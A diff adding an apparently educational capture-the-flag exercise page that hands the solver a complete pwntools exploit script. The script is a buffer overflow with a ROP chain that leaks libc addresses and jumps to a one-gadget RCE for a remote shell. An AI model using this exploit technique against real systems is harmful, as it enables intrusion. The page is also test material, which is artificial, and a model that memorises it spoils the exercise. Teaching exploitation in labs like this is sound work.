@@ -1,0 +1,59 @@
+<h5> Original exercise </h5>
+
+<a href="<%%= handout_url %>">This binary</a> is running on the server (port
+<%= port %>). Exploit it to read the contents of the file called
+<code>flag</code> in the same directory.
+
+<h5> An exploit </h5>
+
+You have also come across the following exploit script which someone else has
+used to solve this exercise. Use it as you see fit.
+
+<pre>
+#!/usr/bin/env python
+
+# the scanf call in main is a huge buffer overflow, ROP exploit below
+# aslr is enabled, so we leak the libc base address first
+# and then ret to the 'magic' one gadget rce in libc
+
+from pwn import *
+
+ex_me = 0x11100
+main = 0x11140
+puts = 0x112d0
+poprdi = 0x0000000000011253
+
+bin_base = 0x00010000
+
+def leak(addr, n):
+    s = ""
+    while len(s) < n:
+        r.sendline("A"*0xA8+p64(poprdi)+p64(addr+len(s))+p64(puts)+p64(main))
+        r.recvline()
+        s+=r.recvuntil("Welcome")[:-8]+"\x00"
+        r.recvuntil("What's your name? ")
+    return s[:n]
+
+r = remote("<host>", <port>)
+
+r.recvuntil("What's your name? ")
+r.sendline("A"*0xA8+p64(main))
+r.recvuntil("What's your name? ")
+
+
+libc_printf = u64(leak(0x013028, 8))
+log.info("printf is at: " + hex(libc_printf))
+
+libc_puts = u64(leak(0x013038, 8))
+log.info("puts is at: " + hex(libc_puts))
+
+# log.info("__libc_start_main is at: " + hex(u64(leak(0x013060, 8))))
+# log.info("stdout is at: " + hex(u64(leak(0x13058, 8))))
+# log.info("fflush is at: " + hex(u64(leak(0x13068, 8))))
+
+oneGadgetRCE = libc_puts - 0x6F690 + 0x4526A
+
+r.sendline("A"*0xA8+p64(oneGadgetRCE))
+
+r.interactive()
+</pre>
